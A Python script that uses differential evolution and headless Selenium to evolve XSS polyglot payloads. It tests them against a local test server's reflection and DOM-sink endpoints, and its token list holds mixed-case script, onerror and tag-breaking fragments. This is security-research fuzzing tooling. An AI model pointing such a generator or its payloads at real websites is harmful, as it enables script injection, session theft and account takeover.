import numpy as np
import random
import datetime

from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

caps = DesiredCapabilities().CHROME
caps["pageLoadStrategy"] = "none"

# Set up Selenium WebDriver in headless mode
options = webdriver.ChromeOptions()
options.add_argument("--headless")
service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service, options=options)

tokens = [
    "/xss.js",
    "jAvAsCriPt:", "'document.cookie=1'", "`document.cookie=1`", "document.cookie=1", '"document.cookie=1"',
    "<ScRiPt>document.cookie=1</ScRiPt>", "<ScRiPt sRc='/xss.js'></ScRiPt>", '<ScRiPt sRc="/xss.js"></ScRiPt>',
    '<ScRiPt sRc=`/xss.js`></ScRiPt>',
    '<iMg SrC OneRror=`document.cookie=1`>',
    "<iMg SrC OneRror='document.cookie=1'>",
    '<iMg SrC OneRror="document.cookie=1">',
    # 'iMg SrC="/xss.js" OneRror="document.cookie=1"',
    " ", ";", ",", "'", "/", "<!--", "-->", "--!>", "(", ")", "/*", "-", "`",
    '"', "*", "*/", "\\x20", "\\x27", "%20", "{", "}", "[", "]",
    "<", "%0A",
    "<script", "<img", "<svg", "<div", "<body", "<iframe", "<a",
    "<sCrIpT", "<iMg", "<sVg", "<div", "<BOdy", "<IfRame", " sRc=", " oNLoAd='document.cookie=1'", " oNeRrOr='document.cookie=1'", "</a>", "</bUtTon>",
    "</iNpUt>", "</frAmEsEt>", "</teMplAte>", "</auDio>", "</viDeO>", "</sOurCe>", "</hTmL>", "</nOeMbed>", "</noScRIpt>", "</StYle>",
    "</ifRaMe>", "</xMp>", "</texTarEa>", "</nOfRaMeS>", "</tITle>", ">"
]

# Differential Evolution parameters
population_size = 70
max_generations = 50
mutation_factor = 0.85
crossover_rate = 0.85
max_string_length = 200

# List of endpoints for testing
endpoints = [
    "/ref_html_plain/inline/no",
    "/ref_html_plain/inline/script",
    "/ref_html_tagname/inline/stripTags",
    "/ref_html_attr_key/inline/stripTags",
    "/ref_html_attr_value/inline/stripTags",
    "/ref_html_attr_single/inline/stripTags",
    "/ref_html_attr_double/inline/stripTags",
    "/ref_html_comment/inline/no",
    "/ref_html_title/inline/no",
    "/ref_html_css/inline/no",
    "/ref_html_textarea/inline/no",
    "/ref_html_noscript/inline/no",
    "/ref_html_template/inline/no",
    "/ref_html_noembed/inline/no",
    "/ref_html_iframe/inline/no",
    "/ref_html_iframe_src/inline/stripTags",
    "/ref_html_iframe_srcdoc/inline/no",
    "/ref_js_literal/nonce/no",
    "/ref_js_literal_single/nonce/no",
    "/ref_js_literal_double/nonce/no",
    "/ref_js_literal_template/nonce/no",
    "/ref_js_literal_regex/nonce/no",
    "/ref_js_func/nonce/no",
    "/ref_js_if/nonce/no",
    "/ref_js_comment_single/nonce/no",
    "/ref_js_comment_multi/nonce/no",
    "/ref_url_image/inline/stripTags",
    "/ref_url_script/no/htmlEntities",
    "/ref_url_iframe/no/htmlEntities",
    "/dom_innerhtml/inline/no",
    "/dom_docwrite/inline/no",
    "/dom_append/dynamic/no",
    "/dom_eval/eval/no",
    "/dom_replace/no/htmlEntities",
    "/dom_src/no/htmlEntities"
]


# Evaluation function
def evaluate_xss_payload(payload):
    base_url = "http://localhost:8080"
    payload_str = ''.join(payload)
    score_vector = np.zeros(len(endpoints))
    for i, endpoint in enumerate(endpoints):
        test_url = f"{base_url}{endpoint}?payload={payload_str}"
        try:
            driver.get(test_url)
            if driver.get_cookies():
                score_vector[i] = 1
                driver.delete_all_cookies()
        except Exception as e:
            print(f"Error testing {endpoint}: {e}")
    total_score = np.sum(score_vector)
    print(score_vector, total_score, "\n", payload_str)
    return total_score, score_vector




# Generate an initial population
def generate_initial_population(size, tokens, max_string_length):
    population = []
    for _ in range(size):
        individual = []
        t = random.choice(tokens)
        while len(''.join(individual)) + len(t) < max_string_length:
            individual.append(random.choice(tokens))
            t = random.choice(tokens)
        population.append(individual)
    return population

# Mutation operation considering individual lengths
def mutate(population, target_idx, mutation_factor, tokens):
    # Population indices excluding the target index
    indices = list(range(len(population)))
    indices.remove(target_idx)

    # Randomly select three distinct individuals from the population
    a_idx, b_idx, c_idx = random.sample(indices, 3)
    a, b, c = population[a_idx], population[b_idx], population[c_idx]

    # Create the mutant polyglot considering individual lengths
    mutant = []
    a_length, b_length, c_length = len(a), len(b), len(c)
    max_length = max(a_length, b_length, c_length)

    for i in range(max_length):
        if i < a_length and i < b_length and i < c_length:
            # Use differential evolution formula for the mutation
            token_choice = a[i] if random.random() < mutation_factor else (b[i] if random.random() < 0.5 else c[i])
        elif i < a_length:
            token_choice = a[i]
        elif i < b_length:
            token_choice = b[i]
        elif i < c_length:
            token_choice = c[i]
        else:
            # If index exceeds the length of all a, b, and c, pick a random token
            token_choice = random.choice(tokens)
        mutant.append(token_choice)

    return mutant


def crossover(target, mutant, crossover_rate, tokens, max_string_length):
    trial = []
    total_length = 0
    rand_index = random.randint(0, len(target) - 1)

    for i in range(len(target)):
        if random.random() < crossover_rate or i == rand_index:
            elem = mutant[i] if i < len(mutant) else random.choice(tokens)
        else:
            elem = target[i]

        if total_length + len(elem) > max_string_length:
            break

        trial.append(elem)
        total_length += len(elem)

    return trial


# Selection operation
def select(target, trial, eval_func):
    target_score, target_score_vector = eval_func(target)
    trial_score, trial_score_vector = eval_func(trial)
    if trial_score > target_score:
        return trial, trial_score, trial_score_vector
    else:
        if trial_score == target_score:
            if len(''.join(trial)) < len(''.join(target)):
                return trial, trial_score, trial_score_vector
        return target, target_score, target_score_vector


# Main Differential Evolution Algorithm with Real-Time Scoring
def differential_evolution(tokens, eval_func, population_size, max_generations, mutation_factor, crossover_rate,
                           max_string_length):
    population = generate_initial_population(population_size, tokens, max_string_length)
    best_individual = None
    best_fitness = 0
    best_polyglot_vector = None
    start_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    for generation in range(max_generations):
        for i in range(population_size):
            target = population[i]
            mutant = mutate(population, i, mutation_factor, tokens)
            trial = crossover(target, mutant, crossover_rate, tokens, max_string_length)
            population[i], fitness, score_vector = select(target, trial, eval_func)
            if fitness > best_fitness:

                best_fitness = fitness
                best_individual = population[i]
                best_polyglot_vector = score_vector
            else:
                if best_fitness != 0 and fitness == best_fitness:
                    if len(''.join(population[i])) < len(''.join(best_individual)):
                        best_fitness = fitness
                        best_individual = population[i]
                        best_polyglot_vector = score_vector


        print(f"Generation {generation}: Best Fitness = {best_fitness}, Score Vector = {best_polyglot_vector}, \n Best polyglot: {''.join(best_individual)}")

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        with open('best_xss_payload_'+start_time+'.txt', 'a') as file:
            file.write(f"Timestamp: {timestamp} \n Generation {generation}: Best Fitness = {best_fitness}, Score Vector = {best_polyglot_vector}, \n Best polyglot: {''.join(best_individual)} \n")

    return best_individual, best_fitness


# Usage
best_position, best_fitness = differential_evolution(
    tokens=tokens,
    eval_func=evaluate_xss_payload,
    population_size=population_size,
    max_generations=max_generations,
    mutation_factor=mutation_factor,
    crossover_rate=crossover_rate,
    max_string_length=max_string_length
)

print("Best XSS Polyglot:", ''.join(best_position))
print("Best Fitness Score:", best_fitness)

driver.quit()
